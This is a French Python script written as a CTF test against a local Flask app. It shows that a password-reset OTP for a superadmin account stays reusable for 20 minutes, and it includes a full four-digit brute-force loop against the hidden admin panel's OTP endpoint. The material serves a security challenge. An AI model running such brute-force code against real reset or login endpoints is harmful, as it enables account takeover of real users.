#!/usr/bin/env python3
"""
Test pour vérifier la persistance de l'OTP après validation
Démontre que l'OTP reste valide 20 minutes même après usage
"""

import requests
import time
import random
from requests.sessions import Session

def test_otp_persistence():
    """Test de la persistance de l'OTP après validation"""
    base_url = "http://127.0.0.1:5000"
    
    print("🔍 Test de la persistance de l'OTP")
    print("=" * 50)
    
    # Créer une session
    session = Session()
    
    # 1. Demander un reset de mot de passe
    print("1. Demande de reset de mot de passe...")
    forgot_data = {
        'email': 'superadmin@internal.pentest-recruit.fr'
    }
    
    response = session.post(
        f"{base_url}/_hidden_panel_admin/forgot_password",
        data=forgot_data
    )
    
    if response.status_code == 200:
        print("   ✅ Email envoyé, OTP généré")
        print("   💡 OTP valide pour 20 minutes, même après validation")
    else:
        print("   ❌ Erreur lors de l'envoi de l'email")
        return
    
    # 2. Simuler plusieurs tentatives de validation OTP
    print("\n2. Simulation de brute-force OTP...")
    
    # Tester quelques codes (on ne connaît pas le vrai code)
    test_codes = ['0000', '1234', '9999', '5555']
    
    for i, code in enumerate(test_codes):
        print(f"   Tentative {i+1}: Test du code {code}")
        
        otp_data = {'otp': code}
        response = session.post(
            f"{base_url}/_hidden_panel_admin/validate_otp",
            data=otp_data
        )
        
        if "Code OTP validé avec succès" in response.text:
            print(f"   🎉 Code {code} VALIDE trouvé!")
            
            # 3. Tester que l'OTP fonctionne encore
            print("\n3. Test de réutilisation du même OTP...")
            
            # Créer une nouvelle session pour simuler un autre attaquant
            new_session = Session()
            
            # Refaire le processus de forgot password
            new_session.post(
                f"{base_url}/_hidden_panel_admin/forgot_password",
                data=forgot_data
            )
            
            # Essayer le même code OTP
            otp_retest = {'otp': code}
            response2 = new_session.post(
                f"{base_url}/_hidden_panel_admin/validate_otp",
                data=otp_retest
            )
            
            if "Code OTP validé avec succès" in response2.text:
                print(f"   ✅ SUCCÈS: Le code {code} fonctionne encore!")
                print("   💡 L'OTP reste valide même après validation")
            else:
                print(f"   ❌ Le code {code} ne fonctionne plus")
            
            break
        else:
            print(f"   ❌ Code {code} invalide")
    
    print("\n" + "=" * 50)
    print("🎯 Résumé du test:")
    print("• L'OTP est généré une seule fois lors de l'envoi d'email")
    print("• L'OTP reste valide 20 minutes même après validation réussie")
    print("• Permet le brute-force continu sans regénération")
    print("• L'OTP n'est supprimé qu'après changement effectif du mot de passe")

def simulate_brute_force():
    """Simulation de brute-force complet (attention: 10000 requêtes!)"""
    print("\n🚨 ATTENTION: Brute-force complet de 0000 à 9999")
    print("Cela va prendre du temps et faire 10000 requêtes!")
    
    response = input("Voulez-vous continuer? (oui/non): ")
    if response.lower() not in ['oui', 'o', 'yes', 'y']:
        print("Simulation annulée.")
        return
    
    base_url = "http://127.0.0.1:5000"
    session = Session()
    
    # Demander reset de mot de passe
    forgot_data = {'email': 'superadmin@internal.pentest-recruit.fr'}
    session.post(f"{base_url}/_hidden_panel_admin/forgot_password", data=forgot_data)
    
    print("🔍 Début du brute-force...")
    start_time = time.time()
    
    for code in range(10000):
        otp_code = f"{code:04d}"  # Format sur 4 chiffres
        
        if code % 100 == 0:  # Affichage tous les 100 codes
            print(f"   Testé jusqu'à {otp_code}...")
        
        otp_data = {'otp': otp_code}
        response = session.post(
            f"{base_url}/_hidden_panel_admin/validate_otp",
            data=otp_data
        )
        
        if "Code OTP validé avec succès" in response.text:
            elapsed = time.time() - start_time
            print(f"\n🎉 CODE TROUVÉ: {otp_code}")
            print(f"⏱️  Temps écoulé: {elapsed:.2f} secondes")
            print(f"🔢 Codes testés: {code + 1}")
            return
    
    print("❌ Aucun code valide trouvé (possible expiration)")

if __name__ == "__main__":
    print("🧪 Test de persistance OTP - Challenge CTF")
    print("Assurez-vous que l'application Flask est démarrée sur localhost:5000")
    print()
    
    choice = input("Choisissez un test:\n1. Test de persistance simple\n2. Brute-force complet\nChoix (1/2): ")
    
    if choice == "1":
        test_otp_persistence()
    elif choice == "2":
        simulate_brute_force()
    else:
        print("Choix invalide.")